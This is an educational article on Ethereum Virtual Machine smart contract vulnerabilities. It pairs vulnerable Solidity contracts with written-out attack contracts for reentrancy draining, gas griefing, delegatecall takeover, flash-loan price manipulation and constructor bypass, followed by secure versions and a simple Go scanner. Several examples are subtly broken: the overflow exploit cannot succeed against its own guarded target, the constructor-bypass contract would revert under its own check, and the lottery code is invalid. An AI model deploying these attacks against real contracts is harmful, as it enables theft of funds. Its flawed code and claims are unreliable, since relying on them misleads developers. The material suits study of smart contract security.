# EVM-Specific Vulnerabilities and Exploits

## Foundation: Understanding the EVM

The **Ethereum Virtual Machine (EVM)** is a stack-based virtual machine that executes smart contract bytecode. Understanding its architecture is crucial for identifying vulnerabilities.

### EVM Stack and Memory Model

The EVM operates with:
- **256-bit word size** (32 bytes)
- **Stack-based architecture** with 1024 maximum depth
- **Three data locations**: storage, memory, calldata
- **Gas-based execution model**

```solidity
// Basic EVM operations demonstration
contract EVMBasics {
    uint256 public storageVar;     // STORAGE - persistent
    
    function memoryExample() public pure returns (bytes32) {
        bytes32 memVar;            // MEMORY - temporary
        assembly {
            memVar := mload(0x40)   // Load from free memory pointer
        }
        return memVar;
    }
}
```

## Core EVM Vulnerabilities

### 1. Reentrancy Attacks

**Mechanism**: Exploiting external calls to recursively call back into the vulnerable contract before state updates complete.

**Root Cause**: EVM's call stack allows external contracts to execute code during the current contract's execution.

```solidity
// VULNERABLE CONTRACT
contract VulnerableBank {
    mapping(address => uint256) public balances;
    
    function withdraw(uint256 amount) public {
        require(balances[msg.sender] >= amount, "Insufficient balance");
        
        // VULNERABILITY: External call before state update
        (bool success,) = msg.sender.call{value: amount}("");
        require(success, "Transfer failed");
        
        balances[msg.sender] -= amount; // State update happens after external call
    }
    
    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }
}

// ATTACK CONTRACT
contract ReentrancyAttacker {
    VulnerableBank public bank;
    uint256 public attackAmount = 1 ether;
    
    constructor(address _bank) {
        bank = VulnerableBank(_bank);
    }
    
    function attack() public payable {
        require(msg.value >= attackAmount, "Need attack amount");
        bank.deposit{value: attackAmount}();
        bank.withdraw(attackAmount);
    }
    
    // Fallback function - called during bank.withdraw()
    fallback() external payable {
        if (address(bank).balance >= attackAmount) {
            bank.withdraw(attackAmount); // Recursive call
        }
    }
}
```

**Protection Mechanisms**:

```solidity
// SECURE IMPLEMENTATION
contract SecureBank {
    mapping(address => uint256) public balances;
    bool private locked;
    
    modifier noReentrant() {
        require(!locked, "Reentrant call");
        locked = true;
        _;
        locked = false;
    }
    
    // Checks-Effects-Interactions pattern
    function withdraw(uint256 amount) public noReentrant {
        require(balances[msg.sender] >= amount, "Insufficient balance");
        
        // Effects: Update state first
        balances[msg.sender] -= amount;
        
        // Interactions: External calls last
        (bool success,) = msg.sender.call{value: amount}("");
        require(success, "Transfer failed");
    }
}
```

### 2. Integer Overflow/Underflow

**Pre-Solidity 0.8.0 Issue**: EVM doesn't check for arithmetic overflows by default.

```solidity
// VULNERABLE (Solidity < 0.8.0)
contract VulnerableToken {
    mapping(address => uint256) public balances;
    
    function transfer(address to, uint256 amount) public {
        // VULNERABILITY: No overflow protection
        require(balances[msg.sender] >= amount);
        balances[msg.sender] -= amount;  // Can underflow
        balances[to] += amount;          // Can overflow
    }
}

// ATTACK DEMONSTRATION
contract OverflowAttack {
    VulnerableToken token;
    
    function exploit() public {
        // If balance is 1, subtracting 2 causes underflow
        // uint256 max value: 2^256 - 1
        token.transfer(address(this), 2);
        // Now attacker has ~2^256 tokens
    }
}
```

**Modern Protection** (Solidity 0.8.0+):

```solidity
// SECURE (Solidity >= 0.8.0)
contract SecureToken {
    mapping(address => uint256) public balances;
    
    function transfer(address to, uint256 amount) public {
        // Automatic overflow/underflow checks
        balances[msg.sender] -= amount;  // Reverts on underflow
        balances[to] += amount;          // Reverts on overflow
    }
    
    // Manual protection for older versions
    function safeTransfer(address to, uint256 amount) public {
        require(balances[msg.sender] >= amount, "Insufficient balance");
        require(balances[to] + amount >= balances[to], "Overflow protection");
        
        balances[msg.sender] -= amount;
        balances[to] += amount;
    }
}
```

### 3. Gas Limit and Denial of Service

**Mechanism**: Exploiting EVM's gas limit to prevent contract execution.

```solidity
// VULNERABLE AUCTION CONTRACT
contract VulnerableAuction {
    address[] public bidders;
    mapping(address => uint256) public bids;
    
    function bid() public payable {
        require(msg.value > 0, "Must send ether");
        bidders.push(msg.sender);
        bids[msg.sender] = msg.value;
    }
    
    // VULNERABILITY: Unbounded loop
    function refundAll() public {
        for (uint256 i = 0; i < bidders.length; i++) {
            address bidder = bidders[i];
            uint256 amount = bids[bidder];
            
            (bool success,) = bidder.call{value: amount}("");
            // If any call fails or consumes too much gas, entire function fails
        }
    }
}

// ATTACK CONTRACT
contract GasAttack {
    VulnerableAuction auction;
    
    constructor(address _auction) {
        auction = VulnerableAuction(_auction);
    }
    
    function attack() public payable {
        // Create many bids to make refundAll() exceed gas limit
        for (uint256 i = 0; i < 1000; i++) {
            auction.bid{value: 1 wei}();
        }
    }
    
    // Consume gas when receiving refund
    fallback() external payable {
        uint256 waste;
        for (uint256 i = 0; i < 10000; i++) {
            waste += i;
        }
    }
}
```

**Secure Implementation**:

```solidity
contract SecureAuction {
    mapping(address => uint256) public bids;
    
    function bid() public payable {
        require(msg.value > 0, "Must send ether");
        bids[msg.sender] += msg.value;
    }
    
    // Pull-over-push pattern
    function withdraw() public {
        uint256 amount = bids[msg.sender];
        require(amount > 0, "No funds to withdraw");
        
        bids[msg.sender] = 0;  // Update state first
        
        (bool success,) = msg.sender.call{value: amount}("");
        require(success, "Transfer failed");
    }
}
```

### 4. Front-Running and MEV Attacks

**Mechanism**: Exploiting EVM's transaction ordering and mempool visibility.

```solidity
// VULNERABLE PRICE ORACLE
contract VulnerablePriceGame {
    uint256 public price = 100;
    address public winner;
    
    function guessPrice(uint256 guess) public payable {
        require(msg.value == 1 ether, "Must pay 1 ETH");
        
        if (guess == price) {
            winner = msg.sender;
            // Winner gets prize
            (bool success,) = msg.sender.call{value: address(this).balance}("");
            require(success);
        }
        
        // Update price based on external oracle
        price = getExternalPrice();
    }
    
    function getExternalPrice() internal view returns (uint256) {
        // Simplified oracle call
        return 150;
    }
}
```

**Attack Scenario**:
1. Victim submits `guessPrice(150)` transaction
2. Attacker sees transaction in mempool
3. Attacker submits same transaction with higher gas price
4. Attacker's transaction executes first, winning the prize

**Protection Mechanisms**:

```solidity
contract SecurePriceGame {
    struct Commitment {
        bytes32 commitment;
        uint256 timestamp;
        bool revealed;
    }
    
    mapping(address => Commitment) public commitments;
    uint256 public revealPeriod = 1 hours;
    
    // Commit-Reveal scheme
    function commitGuess(bytes32 commitment) public payable {
        require(msg.value == 1 ether, "Must pay 1 ETH");
        
        commitments[msg.sender] = Commitment({
            commitment: commitment,
            timestamp: block.timestamp,
            revealed: false
        });
    }
    
    function revealGuess(uint256 guess, uint256 nonce) public {
        Commitment storage commitment = commitments[msg.sender];
        
        require(!commitment.revealed, "Already revealed");
        require(
            block.timestamp >= commitment.timestamp + revealPeriod,
            "Reveal period not started"
        );
        require(
            keccak256(abi.encodePacked(guess, nonce)) == commitment.commitment,
            "Invalid reveal"
        );
        
        commitment.revealed = true;
        
        // Process guess...
    }
}
```

### 5. Delegate Call Vulnerabilities

**Mechanism**: `delegatecall` executes code in the caller's context, potentially corrupting storage.

```solidity
// VULNERABLE PROXY CONTRACT
contract VulnerableProxy {
    address public implementation;
    address public owner;
    
    constructor(address _implementation) {
        implementation = _implementation;
        owner = msg.sender;
    }
    
    // VULNERABILITY: Unprotected delegatecall
    function execute(bytes calldata data) public {
        (bool success,) = implementation.delegatecall(data);
        require(success, "Delegatecall failed");
    }
}

// MALICIOUS IMPLEMENTATION
contract MaliciousImplementation {
    address public implementation;  // Slot 0
    address public owner;          // Slot 1
    
    function becomeOwner() public {
        owner = msg.sender;  // Overwrites proxy's owner!
    }
}
```

**Storage Layout Collision**:

| Contract | Slot 0 | Slot 1 |
|----------|--------|--------|
| VulnerableProxy | implementation | owner |
| MaliciousImplementation | implementation | owner |

**Attack Process**:
1. Deploy `MaliciousImplementation`
2. Call `proxy.execute(abi.encodeWithSignature("becomeOwner()"))`
3. `becomeOwner()` executes in proxy's context
4. Attacker becomes proxy owner

**Secure Implementation**:

```solidity
contract SecureProxy {
    // Storage slots for implementation and admin
    bytes32 private constant IMPLEMENTATION_SLOT = 
        bytes32(uint256(keccak256("eip1967.proxy.implementation")) - 1);
    bytes32 private constant ADMIN_SLOT = 
        bytes32(uint256(keccak256("eip1967.proxy.admin")) - 1);
    
    modifier onlyAdmin() {
        require(msg.sender == getAdmin(), "Not admin");
        _;
    }
    
    function upgrade(address newImplementation) public onlyAdmin {
        setImplementation(newImplementation);
    }
    
    function getAdmin() public view returns (address) {
        return StorageSlot.getAddressSlot(ADMIN_SLOT).value;
    }
    
    function setImplementation(address newImplementation) internal {
        StorageSlot.getAddressSlot(IMPLEMENTATION_SLOT).value = newImplementation;
    }
    
    fallback() external payable {
        address impl = StorageSlot.getAddressSlot(IMPLEMENTATION_SLOT).value;
        assembly {
            calldatacopy(0, 0, calldatasize())
            let result := delegatecall(gas(), impl, 0, calldatasize(), 0, 0)
            returndatacopy(0, 0, returndatasize())
            
            switch result
            case 0 { revert(0, returndatasize()) }
            default { return(0, returndatasize()) }
        }
    }
}
```

## Advanced EVM Attack Vectors

### 6. Block Timestamp Manipulation

**Mechanism**: Miners can manipulate `block.timestamp` within ~15 seconds.

```solidity
// VULNERABLE LOTTERY
contract VulnerableLottery {
    mapping(address => uint256) public bets;
    uint256 public bettingDeadline;
    
    function placeBet() public payable {
        require(block.timestamp < bettingDeadline, "Betting closed");
        bets[msg.sender] = msg.value;
    }
    
    function determineWinner() public {
        require(block.timestamp >= bettingDeadline, "Betting still open");
        
        // VULNERABILITY: Using block.timestamp for randomness
        uint256 randomNumber = uint256(keccak256(abi.encodePacked(
            block.timestamp,
            block.difficulty,
            msg.sender
        ))) % 100;
        
        // Determine winner based on randomNumber...
    }
}
```

**Secure Randomness**:

```solidity
contract SecureLottery {
    using VRFConsumerV2 for VRFCoordinatorV2Interface;
    
    VRFCoordinatorV2Interface COORDINATOR;
    uint64 subscriptionId;
    bytes32 keyHash;
    
    struct RequestStatus {
        bool fulfilled;
        bool exists;
        uint256[] randomWords;
    }
    
    mapping(uint256 => RequestStatus) public requests;
    uint256 public lastRequestId;
    
    function requestRandomWinner() public returns (uint256 requestId) {
        requestId = COORDINATOR.requestRandomWords(
            keyHash,
            subscriptionId,
            3,    // requestConfirmations
            100000, // callbackGasLimit
            1     // numWords
        );
        
        requests[requestId] = RequestStatus({
            randomWords: new uint256[](0),
            exists: true,
            fulfilled: false
        });
        
        lastRequestId = requestId;
        return requestId;
    }
    
    function fulfillRandomWords(
        uint256 requestId,
        uint256[] memory randomWords
    ) internal override {
        require(requests[requestId].exists, "Request not found");
        requests[requestId].fulfilled = true;
        requests[requestId].randomWords = randomWords;
        
        // Use randomWords[0] to determine winner
        determineWinner(randomWords[0]);
    }
}
```

### 7. Flash Loan Attacks

**Mechanism**: Exploiting price oracles and liquidity within a single transaction.

```solidity
// VULNERABLE DEFI PROTOCOL
contract VulnerableDefi {
    IERC20 public token;
    mapping(address => uint256) public deposits;
    
    function deposit(uint256 amount) public {
        token.transferFrom(msg.sender, address(this), amount);
        deposits[msg.sender] += amount;
    }
    
    function withdraw(uint256 amount) public {
        require(deposits[msg.sender] >= amount, "Insufficient deposit");
        
        // VULNERABILITY: Using spot price for valuation
        uint256 tokenPrice = getTokenPrice();
        uint256 ethValue = (amount * tokenPrice) / 1e18;
        
        deposits[msg.sender] -= amount;
        payable(msg.sender).transfer(ethValue);
    }
    
    function getTokenPrice() public view returns (uint256) {
        // Simplified AMM price calculation
        uint256 tokenBalance = token.balanceOf(address(this));
        uint256 ethBalance = address(this).balance;
        return (ethBalance * 1e18) / tokenBalance;
    }
}

// FLASH LOAN ATTACK
contract FlashLoanAttacker {
    VulnerableDefi defi;
    IERC20 token;
    IFlashLoanProvider flashLoanProvider;
    
    function attack() public {
        // 1. Take flash loan of tokens
        uint256 flashLoanAmount = 1000000 * 1e18;
        flashLoanProvider.flashLoan(address(token), flashLoanAmount, "");
    }
    
    function onFlashLoan(address asset, uint256 amount, bytes calldata data) external {
        // 2. Dump tokens to manipulate price
        token.transfer(address(defi), amount);
        
        // 3. Withdraw at manipulated price
        defi.withdraw(100 * 1e18);  // Withdraw small amount for large ETH value
        
        // 4. Repay flash loan
        token.transferFrom(address(defi), address(flashLoanProvider), amount);
    }
}
```

**Protection with TWAP Oracle**:

```solidity
contract SecureDefi {
    struct PriceObservation {
        uint256 timestamp;
        uint256 price;
    }
    
    PriceObservation[] public priceHistory;
    uint256 public constant TWAP_PERIOD = 30 minutes;
    
    function updatePrice() public {
        uint256 currentPrice = getCurrentSpotPrice();
        priceHistory.push(PriceObservation({
            timestamp: block.timestamp,
            price: currentPrice
        }));
        
        // Keep only relevant history
        cleanOldObservations();
    }
    
    function getTWAPPrice() public view returns (uint256) {
        require(priceHistory.length > 0, "No price data");
        
        uint256 weightedSum = 0;
        uint256 totalWeight = 0;
        uint256 cutoffTime = block.timestamp - TWAP_PERIOD;
        
        for (uint256 i = priceHistory.length; i > 0; i--) {
            PriceObservation memory obs = priceHistory[i - 1];
            if (obs.timestamp < cutoffTime) break;
            
            uint256 weight = obs.timestamp - cutoffTime;
            weightedSum += obs.price * weight;
            totalWeight += weight;
        }
        
        return totalWeight > 0 ? weightedSum / totalWeight : priceHistory[priceHistory.length - 1].price;
    }
}
```

### 8. Short Address Attack

**Mechanism**: Exploiting EVM's right-padding of short addresses in function calls.

```rust
// Rust implementation showing the vulnerability
use ethabi::{encode, Token};

fn demonstrate_short_address_attack() {
    // Normal transfer: transfer(address,uint256)
    let normal_address = "0x1234567890123456789012345678901234567890";
    let amount = 100u64;
    
    // Attacker provides short address (missing last byte)
    let short_address = "0x12345678901234567890123456789012345678";
    
    // EVM right-pads the address, shifting amount left by 8 bits
    // This multiplies the amount by 256!
    
    println!("Normal amount: {}", amount);
    println!("Exploited amount: {}", amount * 256);
}
```

**Solidity Protection**:

```solidity
contract SecureToken {
    function transfer(address to, uint256 amount) public {
        // Validate address length
        require(msg.data.length >= 68, "Invalid call data length");
        
        balances[msg.sender] -= amount;
        balances[to] += amount;
    }
}
```

## EVM Bytecode-Level Vulnerabilities

### 9. Constructor vs Runtime Code Confusion

```solidity
// VULNERABLE: Logic in constructor can be bypassed
contract VulnerableFactory {
    mapping(address => bool) public authorized;
    
    constructor() {
        authorized[msg.sender] = true;
        
        // VULNERABILITY: This check only happens during deployment
        require(msg.sender == tx.origin, "Only EOA can deploy");
    }
    
    function sensitiveOperation() public {
        require(authorized[msg.sender], "Not authorized");
        // Sensitive logic here
    }
}

// ATTACK: Deploy through contract to bypass constructor check
contract FactoryAttacker {
    function deployAndBypass() public {
        // Constructor runs in deployer's context
        VulnerableFactory factory = new VulnerableFactory();
        
        // Attacker is now authorized despite not being EOA during deployment
        factory.sensitiveOperation();
    }
}
```

### 10. Proxy Implementation Initialization

**C++ Implementation of Storage Collision Detection**:

```cpp
#include <iostream>
#include <unordered_map>
#include <string>
#include <vector>

class StorageLayoutAnalyzer {
private:
    std::unordered_map<uint256_t, std::string> proxyStorage;
    std::unordered_map<uint256_t, std::string> implementationStorage;
    
public:
    void addProxyVariable(uint256_t slot, const std::string& name) {
        proxyStorage[slot] = name;
    }
    
    void addImplementationVariable(uint256_t slot, const std::string& name) {
        implementationStorage[slot] = name;
    }
    
    std::vector<std::pair<uint256_t, std::string>> findCollisions() {
        std::vector<std::pair<uint256_t, std::string>> collisions;
        
        for (const auto& [slot, proxyVar] : proxyStorage) {
            if (implementationStorage.find(slot) != implementationStorage.end()) {
                collisions.push_back({slot, 
                    "Collision: " + proxyVar + " vs " + implementationStorage[slot]});
            }
        }
        
        return collisions;
    }
};

// Usage example
void analyzeProxyCollisions() {
    StorageLayoutAnalyzer analyzer;
    
    // Proxy storage layout
    analyzer.addProxyVariable(0, "implementation");
    analyzer.addProxyVariable(1, "admin");
    
    // Implementation storage layout
    analyzer.addImplementationVariable(0, "owner");
    analyzer.addImplementationVariable(1, "balance");
    
    auto collisions = analyzer.findCollisions();
    for (const auto& [slot, description] : collisions) {
        std::cout << "Slot " << slot << ": " << description << std::endl;
    }
}
```

## Gas Optimization and Security Trade-offs

### Assembly Usage Risks

```solidity
contract AssemblyRisks {
    uint256[] public data;
    
    // DANGEROUS: Unchecked array access
    function unsafeArrayAccess(uint256 index) public view returns (uint256) {
        uint256 result;
        assembly {
            let dataSlot := data.slot
            let arrayLength := sload(dataSlot)
            
            // NO BOUNDS CHECKING - VULNERABILITY!
            let elementSlot := add(keccak256(dataSlot, 0x20), index)
            result := sload(elementSlot)
        }
        return result;
    }
    
    // SECURE: Proper bounds checking
    function safeArrayAccess(uint256 index) public view returns (uint256) {
        require(index < data.length, "Index out of bounds");
        
        uint256 result;
        assembly {
            let dataSlot := data.slot
            let elementSlot := add(keccak256(dataSlot, 0x20), index)
            result := sload(elementSlot)
        }
        return result;
    }
}
```

## Vulnerability Detection Tools and Techniques

### Static Analysis Implementation (Go)

```go
package main

import (
    "fmt"
    "go/ast"
    "go/parser"
    "go/token"
    "strings"
)

type VulnerabilityScanner struct {
    vulnerabilities []string
}

func (vs *VulnerabilityScanner) scanForReentrancy(code string) {
    // Simplified reentrancy detection
    if strings.Contains(code, ".call{") && 
       strings.Contains(code, "balances[") {
        
        // Check if balance update comes after external call
        callIndex := strings.Index(code, ".call{")
        balanceIndex := strings.Index(code, "balances[")
        
        if callIndex < balanceIndex {
            vs.vulnerabilities = append(vs.vulnerabilities, 
                "Potential reentrancy: external call before state update")
        }
    }
}

func (vs *VulnerabilityScanner) scanForOverflow(code string) {
    if strings.Contains(code, "pragma solidity") {
        // Extract version
        versionStart := strings.Index(code, "pragma solidity")
        versionLine := code[versionStart:strings.Index(code[versionStart:], ";")]
        
        if !strings.Contains(versionLine, "0.8") {
            if strings.Contains(code, "+=") || strings.Contains(code, "-=") {
                vs.vulnerabilities = append(vs.vulnerabilities,
                    "Potential overflow/underflow in pre-0.8.0 Solidity")
            }
        }
    }
}

func (vs *VulnerabilityScanner) generateReport() {
    fmt.Println("Vulnerability Scan Report:")
    fmt.Println("==========================")
    
    if len(vs.vulnerabilities) == 0 {
        fmt.Println("No vulnerabilities detected.")
    } else {
        for i, vuln := range vs.vulnerabilities {
            fmt.Printf("%d. %s\n", i+1, vuln)
        }
    }
}

func main() {
    scanner := &VulnerabilityScanner{}
    
    // Example contract code
    contractCode := `
    pragma solidity ^0.7.0;
    
    contract Example {
        mapping(address => uint256) balances;
        
        function withdraw(uint256 amount) public {
            require(balances[msg.sender] >= amount);
            msg.sender.call{value: amount}("");
            balances[msg.sender] -= amount;
        }
    }
    `
    
    scanner.scanForReentrancy(contractCode)
    scanner.scanForOverflow(contractCode)
    scanner.generateReport()
}
```

## Comparison with Other VM Vulnerabilities

| Vulnerability Type | EVM | WebAssembly | JVM |
|-------------------|-----|-------------|-----|
| **Reentrancy** | High Risk | Low Risk | Medium Risk |
| **Integer Overflow** | Historical Risk | Trapped | Wrapped |
| **Memory Safety** | Type Safe | Memory Safe | Memory Safe |
| **Gas/Resource Limits** | Built-in | Manual | JIT Optimized |
| **Determinism** | Required | Optional | Non-deterministic |

## Best Practices Summary

### Development Security Checklist

**Smart Contract Security**:
- ✅ Use Checks-Effects-Interactions pattern
- ✅ Implement reentrancy guards
- ✅ Use Solidity 0.8.0+ for overflow protection
- ✅ Validate all external inputs
- ✅ Use TWAP oracles for price feeds
- ✅ Implement proper access controls
- ✅ Test with edge cases and attack scenarios

**Gas Optimization Security**:
- ✅ Avoid unbounded loops
- ✅ Use pull-over-push for payments
- ✅ Implement circuit breakers
- ✅ Monitor gas usage in tests
- ✅ Consider gas griefing attacks

**Advanced Protection**:
- ✅ Multi-signature for critical functions
- ✅ Time locks for upgrades
- ✅ Formal verification for critical logic
- ✅ Bug bounty programs
- ✅ Continuous monitoring and alerting

The EVM's unique characteristics create specific attack vectors that developers must understand and mitigate. By following secure coding practices, using proper testing methodologies, and staying updated with the latest security research, developers can build robust smart contracts that resist these sophisticated attacks.